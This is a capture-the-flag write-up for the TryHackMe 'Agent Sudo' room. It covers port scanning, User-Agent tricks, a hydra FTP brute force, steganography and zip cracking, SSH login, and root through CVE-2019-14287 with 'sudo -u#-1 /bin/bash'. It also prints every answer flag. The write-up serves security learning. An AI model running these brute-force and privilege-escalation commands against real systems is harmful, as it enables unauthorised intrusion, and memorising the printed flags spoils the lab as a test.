# 🔴 AGENT SUDO - CTF WRITEUP

```
┌──(attacker㉿kali)-[~/agent-sudo]
└─$ echo "Starting infiltration..."
```

---

## 📡 RECONNAISSANCE

This room is packed with hands-on tools and challenges. Let's begin by scanning the target host to identify open ports.

### Port Scanning

```bash
nmap -A -T4 -p- 10.49.156.165
```

![Nmap Scan Results](https://remnote-user-data.s3.amazonaws.com/e-wH5Rp-fHehVcv_A3QApJVwHLg6DLD0bmZmMLtx_OxeCqcYYUIeAMPJwCJXI1lH_ayVr_Y8dioTzgKQfaoYFmlH6WEYjqO8TvHl_LT3h7ISxmm8_ISKV_K90bUqSycM.png)

**Results:**
- **Port 21:** FTP
- **Port 22:** SSH  
- **Port 80:** HTTP

> **🚩 FLAG:** How many open ports? → **3**

---

## 🌐 WEB ENUMERATION

Accessing the HTTP service reveals a message from **Agent R**. The message hints that we need to use a **codename** as our User-Agent.

![Web Message](https://remnote-user-data.s3.amazonaws.com/Ibsb7Ppbxt_iAIWl2aUrN1CTmQxCbGUCuhzs01lwV64C05KiANnM98jCpAEoIPV9kiGFcNXuDcBG1fqHG4zj-UFIpAgE6hTTCiujcg--qFnn41nqzUS3sVHBoxp2C9Z8.png)

### User-Agent Manipulation

Since Agent R mentioned using codenames, let's cycle through the alphabet (A-Z) as User-Agent values.

```bash
curl -A "C" -L 10.49.156.165
```

![User-Agent C Response](https://remnote-user-data.s3.amazonaws.com/XMJae8hEW3f999mraRzbdNtCMOjec1PhTlwwcyKhqscbRG_zrppgR5xxh6mVucroHDgOEmJWI8nTJ_X13WCE5QQ1YN-Aa8DgaXcCh0h9n5iBbFq4J5pAFk-GyJkd2tlJ.png)

**Response:** The page redirects and reveals the username: **chris**

> **🚩 FLAG:** How you redirect yourself to a secret page? → **user-agent**
>
> **🚩 FLAG:** What is the agent name? → **chris**

---

## 🔓 FTP BRUTE FORCE

Agent R mentioned that Chris's password is weak. Time to brute-force the FTP service.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 10.49.156.165 ftp
```

**Cracked Password:** `crystal`

> **🚩 FLAG:** FTP password? → **crystal**

---

## 📂 FTP FILE RETRIEVAL

Login to FTP and download all available files:

```bash
ftp 10.49.156.165
# Username: chris
# Password: crystal
get To_agentJ.txt
get cutie.png
get cute-alien.jpg
```

![FTP Files](https://remnote-user-data.s3.amazonaws.com/oDOf3eC-ihzYiRS__tLaVR--tZA7PHRZNemA9VhJaIJhVPrUT1dvvcoRzH_9eoO5cmrdm-6-K7kcz6H0-EDmF3rc0u2AGd2YPfsRbSw2EC_z4mgIBKEVAwqwuCmBaM28.png)

### Analyzing To_agentJ.txt

```bash
cat To_agentJ.txt
```

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real 
picture inside your directory. Your login password is somehow 
stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

**Key Intel:** Login password is hidden in a fake picture using **steganography**.

---

## 🖼️ STEGANOGRAPHY ANALYSIS

### Analyzing cutie.png

```bash
file cutie.png
strings cutie.png
```

![Strings Output](https://remnote-user-data.s3.amazonaws.com/n8Knz3yLXxUBTHrQD2VppXzIIl4YzcTui18GVwsvM_xnwu8iOMQn21x85PdECY9wdWcytZe94cylh71smuELv3OYgbsZKTUci2rfjRVKGMt_P6WHLHIqLsGADfwQqNb5.png)

Discovered an embedded file: `To_agentR.txt`

```bash
zsteg cutie.png
```

![Zsteg Output](https://remnote-user-data.s3.amazonaws.com/DuqXvU1IIq0t3DSpI7ulVC6ktkkS1jy1k-5jgBT-zonrXKEY2QpsYY1_kZHyoDTLVvzwqqtToFe80_eXm08A6P__L3YZ3tvy84OtfLkBeS_Mg3Ydu65Ede5UKtwvzii3.png)

**Finding:** A ZIP file is embedded in the image!

### Extracting Embedded ZIP

The extracted ZIP file requires a password:

![Password Protected ZIP](https://remnote-user-data.s3.amazonaws.com/upABe8YhOirJIJNt6y2HSLFvrpKbiDKQa0JIibcDpZxsjre8BwOltA2yxneKC_6sV7j1a5b8y8jRjsqcmG3LGSBEraMmLOXbKRhyL-dDj_bDDDla3PL-IXjzytmWuN-R.png)

Run `foremost` to extract the embedded file for cracking:

![Foremost Extraction](https://remnote-user-data.s3.amazonaws.com/nAphJE0ZnB8XA3njULtHqWi9aYY3xBn2K6SJssdfgjwhMmMDeU6-iEsC6qT98xP_2w1sS4UYNXOYf71nFcJ__GnCHjj4a4ySKLqgIgZTeEJ4hDzlAy6pRrC64YnCq81Q.png)

```bash
foremost cutie.png
zip2john output/zip/00000000.zip > hash.txt
```

![Zip2john Output](https://remnote-user-data.s3.amazonaws.com/xvyzzT-zvEDJISrBy1gfn7djeHPQ78oOVP_QoQflt0K6fLJDARyscXceB5uUIqshu0uIbokjCIhXJpeKDzimMiCg5MOKaPSYYBshKJbZAFSbv-QQAgRHyIAv2BA59kLz.png)

```bash
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked Password:** `alien`

> **🚩 FLAG:** Zip file password? → **alien**

### Extracting ZIP Contents

```bash
7z x 8702.zip
# Password: alien
cat To_agentR.txt
```

![Extracted ZIP Content](https://remnote-user-data.s3.amazonaws.com/dkxQwb6x4oW1_sRJOQeeJRFysno8xp8kjKkKGoTVaKq8jIQd57M7r6tj9fY3kikshRkJNFZnyp8zbjNJJdEIoEgk8flYFkxZQ-uAWZKr3MGd1ajLxvSPMZU2BeH6RGFg.png)

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

### Decoding Base64

```bash
echo "QXJlYTUx" | base64 -d
# Or use the full command:
cat To_agentR.txt | grep -oE "QX.*" | cut -d "'" -f1 | base64 -d
```

**Decoded:** `Area51`

> **🚩 FLAG:** steg password? → **Area51**

---

## 🛸 EXTRACTING FROM cute-alien.jpg

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
cat message.txt
```

![Steghide Message](https://remnote-user-data.s3.amazonaws.com/kxdU04Qt6c7Wqy3rKwzUYzoFwt7j327lqP3okzfwFMz8ZS6QNX0Se5BrUcb36S7DBIOPJ9ece-XjBclihIrTJrfOfVDY0PnndN4rw7NjqFPFzlhOb5unpZ7tQt_xI-4P.png)

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set 
this password for you.

Your buddy,
chris
```

> **🚩 FLAG:** Who is the other agent (in full name)? → **james**
>
> **🚩 FLAG:** SSH password? → **hackerrules!**

---

## 🔑 SSH ACCESS

```bash
ssh james@10.49.156.165
# Password: hackerrules!
cat user.txt
```

![User Flag](https://remnote-user-data.s3.amazonaws.com/s4iHSVQMR3_eBXZNcaQxLwpYhXRrHDdRc05w6R-GAjqVudrI-9SipzgER5L9aONuAQMbdqX1ekv1WLABFxdZ2tydefbvPQ_ppk_5Sbmo8GgqJl0iu8XmVRs0pBiKG2FF.png)

> **🚩 FLAG:** What is the user flag? → **b03d975e8c92a7c04146cfa7a5a313c7**

---

## 🔍 REVERSE IMAGE SEARCH

Transfer the alien image to your local machine for analysis:

```bash
# On target machine (as james)
cd ~
ls -la
# Found: Alien_autospy.jpg

python3 -m http.server 8000
```

![Python HTTP Server](https://remnote-user-data.s3.amazonaws.com/RcYn5WCWhXVk9niuuM1mVr4oCCocbzHLLjH13mzjYMj-Y70h5B7Ud16nD9rrRvzGAAK9t7o4Lf_xK_Qibe-4GEYx6FojBSOJjWJbALfsi7l7SkEF4xvjg0MSQZ_QqFDE.png)

```bash
# On attacker machine
wget http://10.49.156.165:8000/Alien_autospy.jpg
```

### Image File Details

**Filename:** `Alien_autospy.jpg`  
**Location:** `/home/james/Alien_autospy.jpg`

Upload this image to Google Images or TinEye for reverse image search.

![Reverse Image Search Result](https://remnote-user-data.s3.amazonaws.com/tlLcLpfLPGbTu_TDOnoKqNa6ZwfKt-_biL1Cdbfv5jN83wL_OImtLLB9hS-r0ubXmm2o7wvxQF2m2KNWX_PhMUmDRTy3JjKTD4iAMRoXYcvNlOueRwFdXhOkASsdcqlZ.png)

**Search Result:** The image is from the famous **Roswell alien autopsy** incident.

> **🚩 FLAG:** What is the incident of the photo called? → **Roswell alien autopsy**

---

## 🚀 PRIVILEGE ESCALATION

### Checking Sudo Privileges

```bash
sudo -l
```

![Sudo -l Output](https://remnote-user-data.s3.amazonaws.com/HJlmsdRNI3Rc7JhBHkLsK3xjKoxMtvjoSXlu66ozgcwxzSXfq3GLc7LCn2cfpgUeTsbdIaxv4genX0kwJBPs4345Ui3j2vj8ajykibc5ZDG20vKY9KDtfiJpY_42l3nM.png)

**Output:**
```
(ALL, !root) /bin/bash
```

This configuration is vulnerable to **CVE-2019-14287**.

![CVE-2019-14287 Exploit](https://remnote-user-data.s3.amazonaws.com/Z7JmGSutZULnynbBJRmU_tNmAjGYG5ne1dJeWoQtJk5BEXLex7zm3oGcvgdbOEJmzv8lA6dC9eZhyVLNe65Lb5DqRNquJvuK30hX79xyi6XQJ5jxwQr_Adp66TnGsGuq.png)

> **🚩 FLAG:** CVE number for the escalation? → **CVE-2019-14287**

### Exploiting the Vulnerability

```bash
sudo -u#-1 /bin/bash
```

**Result:** Root shell obtained!

### Capturing the Root Flag

```bash
cat /root/root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for 
TryHackMe. Tips, always update your machine.

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

> **🚩 FLAG:** What is the root flag? → **b53a02f55b57d4439e3341834d70c062**
>
> **🚩 BONUS FLAG:** Who is Agent R? → **DesKel**

---

## 📋 SUMMARY

```
┌─────────────────────────────────────────────────┐
│           EXPLOITATION CHAIN                    │
├─────────────────────────────────────────────────┤
│ 1. Nmap Scan      → Discovered FTP, SSH, HTTP   │
│ 2. User-Agent     → Found username: chris       │
│ 3. Hydra          → Cracked FTP: crystal        │
│ 4. Steganography  → Extracted hidden files      │
│ 5. John           → Cracked ZIP: alien          │
│ 6. Base64         → Decoded: Area51             │
│ 7. Steghide       → Retrieved SSH creds         │
│ 8. SSH            → User access as james        │
│ 9. CVE-2019-14287 → Root privilege escalation   │
│ 10. Root Flag     → Mission Complete!           │
└─────────────────────────────────────────────────┘
```
